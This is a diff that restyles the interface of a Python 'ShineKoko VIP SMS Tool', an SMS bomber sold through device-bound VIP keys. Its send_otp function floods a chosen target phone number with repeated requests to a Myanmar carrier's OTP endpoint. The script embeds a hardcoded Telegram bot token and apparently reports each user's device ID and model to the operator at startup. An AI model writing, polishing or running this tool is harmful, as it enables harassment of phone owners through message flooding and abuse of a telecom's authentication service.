@@ -5,6 +5,16 @@ import requests, time, sys, hashlib, os, platform, subprocess, json, random
 BOT_TOKEN = "8700243285:AAEvVldxc_YeDqZ6FItFnWhcg-18kexzFnw"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".shine_vip_key.json")
 
+# Colors
+G = "\033[1;32m" # Green
+R = "\033[1;31m" # Red
+W = "\033[1;37m" # White
+B = "\033[1;34m" # Blue
+Y = "\033[1;33m" # Yellow
+C = "\033[1;36m" # Cyan
+M = "\033[1;35m" # Magenta
+X = "\033[0m"    # Reset
+
 def clear_screen():
     os.system('cls' if platform.system() == 'Windows' else 'clear')
 
@@ -15,12 +25,18 @@ def typewriter(text, speed=0.03):
         time.sleep(speed)
     print()
 
+def transition_anim():
+    """Short transition animation between screens"""
+    sys.stdout.write(f"\n{G}[*] Redirecting")
+    for _ in range(3):
+        time.sleep(0.2)
+        sys.stdout.write(".")
+        sys.stdout.flush()
+    print(f"{X}")
+
 def hacker_intro():
     clear_screen()
-    # Change terminal color to green on black (for some terminals that support it)
-    print("\033[0;32m") 
-    
-    # ASCII Art
+    print(G) 
     ascii_art = r"""
     ███████╗██╗  ██╗██╗███╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗  ██╗ ██████╗ 
     ██╔════╝██║  ██║██║████╗  ██║██╔════╝██║ ██╔╝██╔═══██╗██║ ██╔╝██╔═══██╗
@@ -32,7 +48,6 @@ def hacker_intro():
     print(ascii_art)
     time.sleep(0.5)
     
-    # System Check Animation
     checks = [
         "INITIALIZING CORE SYSTEMS...",
         "CHECKING NETWORK PROTOCOLS... [OK]",
@@ -45,29 +60,26 @@ def hacker_intro():
     ]
     
     for check in checks:
-        print(f"[*] {check}")
-        time.sleep(random.uniform(0.05, 0.2))
+        print(f"{W}[*]{G} {check}")
+        time.sleep(random.uniform(0.05, 0.15))
     
-    print("\n" + "="*50)
+    print("\n" + f"{W}" + "="*60)
     
-    # Hacker Loading Bar
     prefix = "STABILIZING ACCESS"
     total = 100
     for i in range(total + 1):
-        percent = i
         filled_length = int(30 * i // total)
         bar = '█' * filled_length + '░' * (30 - filled_length)
-        sys.stdout.write(f'\r[+] {prefix}: [{bar}] {percent}% ')
+        sys.stdout.write(f'\r{G}[+] {prefix}: [{bar}] {i}% ')
         sys.stdout.flush()
-        time.sleep(0.03)
-    print("\n" + "="*50 + "\n")
+        time.sleep(0.02)
+    print("\n" + f"{W}" + "="*60 + "\n")
     
-    # Typewriter messages
-    typewriter(">>> Loading VIP Access Panels...", 0.05)
-    typewriter(">>> Accessing Secure Layer...", 0.05)
-    typewriter(">>> Authentication Required. Please provide your VIP Key.", 0.05)
-    time.sleep(1)
-    print("\033[0m") # Reset color
+    typewriter(f"{C}>>> Loading VIP Access Panels...", 0.04)
+    typewriter(f"{C}>>> Accessing Secure Layer...", 0.04)
+    typewriter(f"{C}>>> Authentication Required. Please provide your VIP Key.", 0.04)
+    time.sleep(0.5)
+    print(X)
 
 def get_model():
     try:
@@ -86,35 +98,35 @@ def loading_bar(iteration, total, prefix='Sending', length=30):
     percent = ("{0:.1f}").format(100 * (iteration / float(total)))
     filled_length = int(length * iteration // total)
     bar = '█' * filled_length + '░' * (length - filled_length)
-    sys.stdout.write(f'\r{prefix}... [{bar}] {percent}% ')
+    sys.stdout.write(f'\r{G}[*] {prefix}... [{bar}] {percent}% {X}')
     sys.stdout.flush()
     if iteration == total:
         print()
 
 def banner():
     clear_screen()
-    print("\033[1;32m")
+    print(f"{G}")
     print(r"  ____  _   _ ___ _   _ _____   _  _____  _  _____  ")
     print(r" / ___|| | | |_ _| \ | | ____| | |/ / _ \| |/ / _ \ ")
     print(r" \___ \| |_| || ||  \| |  _|   | ' / | | | ' / | | |")
     print(r"  ___) |  _  || || |\  | |___  | . \ |_| | . \ |_| |")
     print(r" |____/|_| |_|___|_| \_|_____| |_|\_\___/|_|\_\___/ ")
-    print("\n    >>> ShineKoko VIP SMS Tool <<<")
-    print("\033[1;37m" + "="*50)
+    print(f"\n          {Y}>>> {W}ShineKoko VIP SMS Tool {Y}<<<{X}")
+    print(f"{W}╔══════════════════════════════════════════════════╗")
     d_id = get_id()
     model = get_model()
-    print(f"[*] Device ID : \033[1;36m{d_id}\033[1;37m")
-    print(f"[*] Model     : {model}")
+    print(f"  {G}•{W} Device ID : {C}{d_id}{W}")
+    print(f"  {G}•{W} Model     : {W}{model}{W}")
     
     saved = get_saved_key()
     if is_key_valid(saved, d_id):
         key = saved["key"]
         days = int(key.split("-D")[-1])
-        print(f"[*] VIP Status: \033[1;32mActive ({days} Days)\033[1;37m")
+        print(f"  {G}•{W} VIP Status: {G}Active ({days} Days){W}")
     else:
-        print(f"[*] VIP Status: \033[1;31mInactive\033[1;37m")
+        print(f"  {G}•{W} VIP Status: {R}Inactive{W}")
         
-    print("="*50 + "\033[0m")
+    print(f"{W}╚══════════════════════════════════════════════════╝{X}")
     return d_id, model
 
 def send_tg(d_id, model):
@@ -173,25 +185,25 @@ def is_key_valid(key_data, d_id):
 def auth(d_id):
     saved = get_saved_key()
     if is_key_valid(saved, d_id):
-        print("\033[1;32m[+] VIP Session Restored!\033[0m")
+        print(f"{G}[+] VIP Session Restored!{X}")
         time.sleep(1)
         return True
         
     while True:
         banner()
-        print("\033[1;33m[!] Notification sent to Admin. Please wait for your key.\033[0m")
-        key = input("\n[?] Enter VIP Key: ").strip()
+        print(f"{Y}[!] Notification sent to Admin. Please wait for your key.{X}")
+        key = input(f"\n{W}[?]{G} Enter VIP Key: {W}").strip()
         if key.startswith("SHINE-") and d_id in key:
             save_key(key)
-            print("\033[1;32m[+] Key Accepted!\033[0m")
+            print(f"{G}[+] Key Accepted!{X}")
             time.sleep(1)
             return True
-        print("\033[1;31m[!] Invalid Key! Contact Admin.\033[0m")
+        print(f"{R}[!] Invalid Key! Contact Admin.{X}")
         time.sleep(2)
 
 def send_otp(p, c):
     url = "https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={}"
-    print(f"\n[*] Starting SMS Bomber for {p}...")
+    print(f"\n{W}[*] Starting SMS Bomber for {C}{p}{W}...")
     loading_bar(0, c)
     for i in range(c):
         try:
@@ -199,79 +211,94 @@ def send_otp(p, c):
         except: pass
         loading_bar(i + 1, c)
         time.sleep(0.05)
-    print("\n\033[1;32m[+] Process Finished Successfully!\033[0m")
-    input("\nPress Enter to return to menu...")
+    print(f"\n{G}[+] Process Finished Successfully!{X}")
+    input(f"\n{W}Press Enter to return to menu...{X}")
 
 def show_profile(d_id):
     saved = get_saved_key()
     clear_screen()
-    print("\033[1;32m")
-    print("  ╔════════════════════════════════════╗")
-    print("  ║         USER VIP PROFILE           ║")
-    print("  ╚════════════════════════════════════╝\033[0m")
+    print(f"{G}")
+    print("  ╔══════════════════════════════════════════╗")
+    print("  ║         " + W + "USER VIP PROFILE DASHBOARD" + G + "       ║")
+    print("  ╠══════════════════════════════════════════╣")
+    
     if is_key_valid(saved, d_id):
         key = saved["key"]
         activated_at = saved["activated_at"]
         days = int(key.split("-D")[-1])
         expiry_time = activated_at + (days * 24 * 60 * 60)
         remaining = expiry_time - time.time()
+        
         rem_days = int(remaining // (24 * 60 * 60))
         rem_hours = int((remaining % (24 * 60 * 60)) // 3600)
         rem_mins = int((remaining % 3600) // 60)
-        print(f"  \033[1;37m[•] Device ID  : \033[1;36m{d_id}\033[0m")
-        print(f"  \033[1;37m[•] VIP Key    : \033[1;36m{key}\033[0m")
-        print(f"  \033[1;37m[•] Status     : \033[1;32mActive\033[0m")
-        print(f"  \033[1;37m[•] Balance    : \033[1;33m{rem_days} Days Remaining\033[0m")
-        print(f"  \033[1;37m[•] Expires In : \033[1;35m{rem_days}D {rem_hours}H {rem_mins}M\033[0m")
+        
+        print(f"  ║ {W}• Device ID  : {C}{d_id:<24}{G} ║")
+        print(f"  ║ {W}• VIP Key    : {C}{key:<24}{G} ║")
+        print(f"  ║ {W}• Status     : {G}{'ACTIVE':<24}{G} ║")
+        print(f"  ║ {W}• Balance    : {Y}{str(rem_days) + ' Days Left':<24}{G} ║")
+        print(f"  ║ {W}• Expires In : {M}{str(rem_days)+'D '+str(rem_hours)+'H '+str(rem_mins)+'M':<24}{G} ║")
     else:
-        print(f"  \033[1;37m[•] Device ID  : \033[1;36m{d_id}\033[0m")
-        print(f"  \033[1;31m[!] No active VIP key found.\033[0m")
-    print("\033[1;32m  ══════════════════════════════════════\033[0m")
-    input("\nPress Enter to return...")
+        print(f"  ║ {W}• Device ID  : {C}{d_id:<24}{G} ║")
+        print(f"  ║ {R}• [!] No active VIP key found.           {G} ║")
+    
+    print("  ╚══════════════════════════════════════════╝")
+    print(X)
+    input(f"\n{W}Press Enter to return to menu...{X}")
 
 def main_menu(d_id, model):
     while True:
         banner()
-        print(" [1] SMS Tool (Start Bombing)")
-        print(" [2] My Profile (Account Info)")
-        print(" [0] Exit")
-        choice = input("\n[?] Select Option: ").strip()
+        print(f"  {W}╔══════════════════════════════════════╗")
+        print(f"  ║ {G}[1]{W} SMS TOOL (START BOMBING)        ║")
+        print(f"  ║ {G}[2]{W} MY PROFILE (ACCOUNT INFO)       ║")
+        print(f"  ║ {R}[0]{W} EXIT SYSTEM                     ║")
+        print(f"  ╚══════════════════════════════════════╝")
+        
+        choice = input(f"\n{W}[?]{G} Select Option: {W}").strip()
+        
         if choice == '1':
+            transition_anim()
             while True:
                 banner()
-                p = input("\n[?] Enter Target Phone (or 'b' to back): ")
-                if p.lower() == 'b': break
+                print(f"  {Y}--- SMS BOMBING PANEL ---{X}")
+                p = input(f"\n{W}[?]{G} Enter Target Phone {W}(or {R}'b'{W} to back): {C}")
+                if p.lower() == 'b': 
+                    transition_anim()
+                    break
                 if not p.isdigit() or len(p) < 7:
-                    print("\033[1;31m[!] Invalid Phone Number!\033[0m")
+                    print(f"{R}[!] Invalid Phone Number!{X}")
                     time.sleep(1)
                     continue
                 try:
-                    c = int(input("[?] Enter Request Count: "))
+                    c = int(input(f"{W}[?]{G} Enter Request Count: {W}"))
                     send_otp(p, c)
+                    transition_anim()
                 except ValueError:
-                    print("\033[1;31m[!] Invalid count.\033[0m")
+                    print(f"{R}[!] Invalid count.{X}")
                     time.sleep(1)
         elif choice == '2':
+            transition_anim()
             show_profile(d_id)
+            transition_anim()
         elif choice == '0':
-            print("\n\033[1;33m[!] Exiting... Thank you for using ShineKoko VIP!\033[0m")
+            print(f"\n{Y}[!] Exiting... Thank you for using ShineKoko VIP!{X}")
             sys.exit()
         else:
-            print("\033[1;31m[!] Invalid Choice\033[0m")
+            print(f"{R}[!] Invalid Choice{X}")
             time.sleep(1)
 
 if __name__ == '__main__':
     try:
-        # Initial Hacker Intro
         hacker_intro()
-        
         d_id = get_id()
         model = get_model()
         send_tg(d_id, model)
-        
         if auth(d_id):
+            transition_anim()
             main_menu(d_id, model)
     except KeyboardInterrupt:
-        print("\n\n[!] Interrupted by user. Exiting...")
+        print(f"\n\n{R}[!] Interrupted by user. Exiting...{X}")
     except Exception as e:
-        print(f"\n[!] Critical Error: {e}")
+        print(f"\n{R}[!] Critical Error: {e}{X}")
+
